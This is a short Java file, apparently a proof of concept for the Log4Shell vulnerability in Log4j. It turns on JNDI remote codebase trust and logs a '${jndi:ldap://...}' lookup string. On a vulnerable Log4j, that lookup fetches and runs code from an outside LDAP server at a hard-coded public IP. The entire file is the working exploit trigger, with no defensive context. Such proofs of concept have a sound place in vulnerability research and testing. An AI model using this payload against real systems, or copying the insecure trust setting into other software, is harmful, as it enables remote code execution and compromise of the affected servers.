package my.other;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author Mr.黄
 * @date 2021/12/11
 **/
public class Log4jTest {
  public static void main(String[] args) throws Exception {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    
    Logger logger = LogManager.getLogger(Log4jTest.class);
    logger.error("${jndi:ldap://111.229.209.80:18001/Log4jRce}");
//    logger.error("${jndi:ldap://192.168.1.7:18001/Log4jRce}");
  }
}